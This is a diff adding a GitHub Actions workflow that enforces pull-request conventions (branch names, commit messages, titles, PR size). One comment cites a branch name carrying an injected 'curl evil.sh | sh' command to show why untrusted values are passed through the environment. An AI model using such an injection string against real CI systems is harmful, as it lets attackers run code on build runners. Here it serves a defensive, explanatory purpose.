@@ -1,0 +1,133 @@
+# ==============================================================================
+# PR Conventions — pull-request discipline
+#
+# Docs: docs/CI_CD.md
+#
+# Title conventions, branch naming, commit messages, issue linkage, PR size and
+# linear history. Required status check: "PR Conventions".
+#
+# WHY THIS IS NOT A JOB IN ci.yml
+#   Everything checked here lives in the pull request's metadata, and most of
+#   it is fixed without pushing a commit: a contributor edits the title, a
+#   maintainer adds the 'size: exempt' label. As a ci.yml job it only re-ran on
+#   a push, and "Re-run" replays the ORIGINAL event payload — so an edited title
+#   or a newly applied label could never turn the check green. A contributor
+#   had to push an empty commit to get past a typo in a title.
+#
+#   Here the check also runs on `edited`, `labeled` and `unlabeled`, and only
+#   this ~10-second job re-runs, not the build.
+# ==============================================================================
+
+name: PR Conventions
+
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, edited, synchronize, reopened, labeled, unlabeled]
+
+# Editing a title twice in a row should not leave two runs racing to report.
+concurrency:
+  group: pr-conventions-${{ github.event.pull_request.number }}
+  cancel-in-progress: true
+
+permissions:
+  contents: read
+
+jobs:
+  pr-conventions:
+    name: PR Conventions
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      # `actions/checkout` on a pull_request event checks out refs/pull/N/merge
+      # by default — a synthetic merge commit GitHub creates for the PR. That
+      # makes every linear-history check report a false merge commit, so the
+      # head SHA is checked out explicitly instead.
+      #
+      # `fetch-depth: 0` fetches the complete history of every branch, so
+      # `origin/$BASE_REF` is available without a second `git fetch` — which is
+      # what lets the checkout run with `persist-credentials: false`. No
+      # credential is left in .git/config for a later step (or an artifact) to
+      # pick up.
+      - name: Checkout the pull-request head
+        uses: actions/checkout@v5
+        with:
+          fetch-depth: 0
+          ref: ${{ github.event.pull_request.head.sha }}
+          persist-credentials: false
+
+      - name: Verify the base branch is available
+        id: base
+        env:
+          BASE_REF: ${{ github.base_ref }}
+        run: |
+          if ! git rev-parse --verify --quiet "origin/$BASE_REF" >/dev/null; then
+            echo "::error::The base branch 'origin/$BASE_REF' is not present in the clone, so the commit range cannot be computed. This is a bug in the workflow, not in the contribution."
+            exit 1
+          fi
+          echo "Base branch origin/$BASE_REF is available at $(git rev-parse --short "origin/$BASE_REF")."
+
+      # The three validations below each run even when an earlier one failed
+      # (`!cancelled()`), so a contributor sees every problem in one run rather
+      # than fixing the branch name, pushing, and only then learning that the
+      # title is wrong too. They still require the base branch, without which
+      # their output would be meaningless.
+      #
+      # `github.head_ref` is attacker-controlled: a contributor can name a
+      # branch `x; curl evil.sh | sh` and GitHub will interpolate it into the
+      # script before the shell ever sees it. Always pass untrusted values
+      # through the environment and reference them as shell variables.
+      - name: Validate branch naming
+        if: ${{ !cancelled() && steps.base.outcome == 'success' }}
+        env:
+          BASE_REF: ${{ github.base_ref }}
+          HEAD_REF: ${{ github.head_ref }}
+        run: bash scripts/checks/check-branch-name.sh "$HEAD_REF"
+
+      - name: Validate commit messages (Conventional Commits)
+        if: ${{ !cancelled() && steps.base.outcome == 'success' }}
+        env:
+          BASE_REF: ${{ github.base_ref }}
+        run: |
+          bash scripts/checks/check-commit-msg.sh --range "origin/$BASE_REF...HEAD"
+
+      - name: Validate pull-request metadata
+        if: ${{ !cancelled() && steps.base.outcome == 'success' }}
+        env:
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          PR_TITLE: ${{ github.event.pull_request.title }}
+          PR_BODY: ${{ github.event.pull_request.body }}
+          PR_HEAD_REF: ${{ github.head_ref }}
+          PR_BASE_REF: ${{ github.base_ref }}
+          PR_COMMITS: ${{ github.event.pull_request.commits }}
+          PR_ADDITIONS: ${{ github.event.pull_request.additions }}
+          PR_DELETIONS: ${{ github.event.pull_request.deletions }}
+          PR_CHANGED_FILES: ${{ github.event.pull_request.changed_files }}
+          PR_LABELS: ${{ join(github.event.pull_request.labels.*.name, ',') }}
+        run: bash scripts/checks/check-pr-meta.sh
+
+      - name: Semantic pull-request title (advisory annotations)
+        if: ${{ !cancelled() }}
+        uses: amannn/action-semantic-pull-request@v6
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        with:
+          types: |
+            feat
+            fix
+            docs
+            style
+            refactor
+            perf
+            test
+            build
+            ci
+            chore
+            revert
+          requireScope: false
+          subjectPattern: '^[a-z].{1,71}$'
+          subjectPatternError: >
+            The PR title subject must start with a lowercase letter and be at
+            most 72 characters, because it becomes the squash-merge commit on
+            main.
+        continue-on-error: true
